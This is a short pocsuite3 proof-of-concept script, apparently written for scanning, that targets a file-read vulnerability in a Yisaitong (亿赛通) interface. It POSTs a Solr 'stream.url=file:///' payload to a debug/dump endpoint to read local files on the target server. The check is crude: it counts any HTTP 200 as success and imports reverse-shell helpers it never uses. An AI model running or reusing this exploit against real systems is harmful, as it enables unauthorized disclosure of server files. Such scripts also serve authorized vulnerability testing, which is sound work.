# _*_ coding:utf-8 _*_
# @Time : 2023/12/20
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yisaitong_upload(POCBase):
    pocDesc = '''亿赛通某接口文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-20'
    name = '亿赛通某接口文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/solr/flow/debug/dump?param=ContentStreams'
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            data = 'stream.url=file:///C:\Program Files\ '

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yisaitong_upload)